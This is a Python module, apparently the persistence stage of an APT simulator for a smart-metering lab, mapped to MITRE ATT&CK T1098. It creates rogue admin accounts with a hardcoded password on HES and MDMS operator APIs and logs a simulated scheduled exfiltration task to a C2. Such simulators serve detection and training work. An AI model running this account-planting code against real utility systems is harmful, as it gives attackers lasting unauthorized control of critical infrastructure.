"""
APT Simulator — Stage 3: Persistence
======================================
MITRE ATT&CK for ICS: T1098 — Account Manipulation (Persistence)

After gaining initial access to the HES, the attacker establishes
persistence by creating a rogue admin account in the MDMS. This
ensures continued access even if the original compromised credentials
are changed.
"""

from __future__ import annotations

import asyncio
import logging

import httpx

from shared import config
from shared.models import AttackStage
from attacker.event_log import EventLog

logger = logging.getLogger(__name__)

STAGE = AttackStage.PERSISTENCE
TECHNIQUE_ID = "T1098"
TACTIC = "Persistence"


async def execute(
    event_log: EventLog,
    stage_config: dict = None,
    credentials: dict = None,
) -> dict:
    """
    Execute the Persistence stage.
    
    Creates a rogue admin account in the MDMS using the compromised
    HES credentials to authenticate the request.
    
    Args:
        event_log:   Shared event logger
        stage_config: Config from scenario YAML
        credentials: Compromised creds from Initial Access stage
        
    Returns:
        Summary of persistence actions
    """
    stage_config = stage_config or {}
    credentials = credentials or {}

    rogue_config = stage_config.get("rogue_account", {})
    rogue_username = rogue_config.get("username", "svc_backup")
    rogue_password = rogue_config.get("password", "Sup3rS3cur3!")
    rogue_role = rogue_config.get("role", "admin")

    hes_url = config.HES_URL
    mdms_url = config.MDMS_URL

    logger.info(f"[PERSISTENCE] Establishing persistence via rogue account creation")
    await event_log.log_event(
        stage=STAGE,
        technique_id=TECHNIQUE_ID,
        tactic=TACTIC,
        target="MDMS",
        action="Starting persistence establishment",
        details={"rogue_username": rogue_username, "rogue_role": rogue_role},
    )

    results = {"rogue_account": None, "hes_account": None}

    async with httpx.AsyncClient(timeout=5.0) as client:
        # Step 1: Create rogue account in MDMS
        try:
            resp = await client.post(
                f"{mdms_url}/api/operators",
                json={
                    "username": rogue_username,
                    "password": rogue_password,
                    "role": rogue_role,
                    "created_by": credentials.get("username", "attacker"),
                    "is_rogue": 1,
                },
            )

            if resp.status_code == 200:
                results["rogue_account"] = {
                    "username": rogue_username,
                    "role": rogue_role,
                    "target": "MDMS",
                }
                await event_log.log_event(
                    stage=STAGE,
                    technique_id=TECHNIQUE_ID,
                    tactic=TACTIC,
                    target="MDMS /api/operators",
                    action=f"Rogue admin account '{rogue_username}' created in MDMS",
                    details=results["rogue_account"],
                )
                logger.warning(f"[PERSISTENCE] Rogue account '{rogue_username}' created in MDMS")
            else:
                await event_log.log_event(
                    stage=STAGE,
                    technique_id=TECHNIQUE_ID,
                    tactic=TACTIC,
                    target="MDMS /api/operators",
                    action=f"Failed to create rogue account (HTTP {resp.status_code})",
                    success=False,
                )
        except httpx.ConnectError:
            logger.error("[PERSISTENCE] Cannot connect to MDMS")

        await asyncio.sleep(1.0)

        # Step 2: Create rogue account in HES as well (belt and suspenders)
        try:
            resp = await client.post(
                f"{hes_url}/api/operators",
                json={
                    "username": rogue_username,
                    "password": rogue_password,
                    "role": rogue_role,
                },
            )

            if resp.status_code == 200:
                results["hes_account"] = {
                    "username": rogue_username,
                    "role": rogue_role,
                    "target": "HES",
                }
                await event_log.log_event(
                    stage=STAGE,
                    technique_id=TECHNIQUE_ID,
                    tactic=TACTIC,
                    target="HES /api/operators",
                    action=f"Rogue admin account '{rogue_username}' created in HES",
                    details=results["hes_account"],
                )
                logger.warning(f"[PERSISTENCE] Rogue account '{rogue_username}' created in HES")
        except httpx.ConnectError:
            logger.error("[PERSISTENCE] Cannot connect to HES")

        await asyncio.sleep(0.5)

        # Step 3: Log a simulated scheduled task creation
        await event_log.log_event(
            stage=STAGE,
            technique_id=TECHNIQUE_ID,
            tactic=TACTIC,
            target="MDMS",
            action="Simulated scheduled task created for periodic data exfiltration",
            details={
                "task_name": "mdms_data_sync",
                "schedule": "every 6 hours",
                "action": "Export customer records to external C2",
            },
        )
        logger.info("[PERSISTENCE] Scheduled exfiltration task simulated")

    summary = {
        "success": bool(results["rogue_account"] or results["hes_account"]),
        "rogue_username": rogue_username,
        "accounts_created": sum(1 for v in results.values() if v),
        **results,
    }

    await event_log.log_event(
        stage=STAGE,
        technique_id=TECHNIQUE_ID,
        tactic=TACTIC,
        target="HES + MDMS",
        action=f"Persistence established: {summary['accounts_created']} rogue accounts created",
        details=summary,
    )

    return summary
